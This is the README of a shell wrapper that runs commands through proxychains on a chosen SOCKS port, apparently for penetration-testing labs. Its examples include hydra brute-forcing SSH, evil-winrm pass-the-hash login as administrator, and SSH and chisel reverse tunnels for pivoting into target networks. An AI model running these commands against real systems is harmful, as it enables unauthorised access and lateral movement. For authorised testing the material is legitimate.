# Proxychains-Script
A simple script that allows you to run commands with proxychains on specified ports from the terminal, eliminating the need to configure `/etc/proxychains4.conf` each time.

## Usage

This script allows you to run commands through proxychains with a specified SOCKS5 proxy port.

### Setup

1. **Clone the repository:**

   ```bash
   git clone https://github.com/Zyad-Elsayed/Proxychains-Script.git
   cd Proxychains-Script
   ```

2. **Make the script executable:**

   ```bash
   chmod +x ./p.sh
   ```

3. **Optionally, copy the script to a system-wide location for easy access:**

   ```bash
   sudo cp ./p.sh /usr/local/bin/p.sh
   ```

   This will allow you to run the script from anywhere using `p.sh`.

### Example

Now you can run any command with proxychains without configuring it each time. For example:

- To run `hydra` with proxychains using port `5555`:

  ```bash
  p.sh 5555 hydra -C comb ssh://172.16.2.6
  ```

- To run `ssh` with proxychains using port `5555`:

  ```bash
  p.sh 5555 ssh julian@172.16.2.101 -D 5555
  ```

- To run `evil-winrm` with proxychains using port `5555`:

  ```bash
  p.sh 5555 evil-winrm -i 172.16.2.5 -u administrator -H 4c827b707xxxxxxxxxx9d05872185f7f8
  ```

You can specify any port you need:

```bash
p.sh 1080 ssh julian@172.16.2.101 -D 5555
p.sh 9050 evil-winrm -i 172.16.2.5 -u administrator -H 4c827b707xxxxxxxxxx9d05872185f7f8
```

### Example Dynamic SSH Tunnel Using SOCKS Proxy

1. **On your local Linux host (for pivoting)**:

   ```bash
   ssh -i id_rsa_root root@10.10.110.100 -D 9050
   ```

2. **Using Chisel with SOCKS proxy on port 1080**:

   On your local Linux machine (server):

   ```bash
   chisel server -p 8000 --reverse
   ```

   On the target machine (Windows or Linux):

   ```bash
   .\chisel.exe client 10.10.16.2:8000 R:0.0.0.0:1080:socks
   chisel client 10.10.16.2:8000 R:0.0.0.0:1080:socks
   ```

## Requirements

- `proxychains4` must be installed on your system.
- The script assumes a SOCKS5 proxy running on `127.0.0.1` with the specified port.
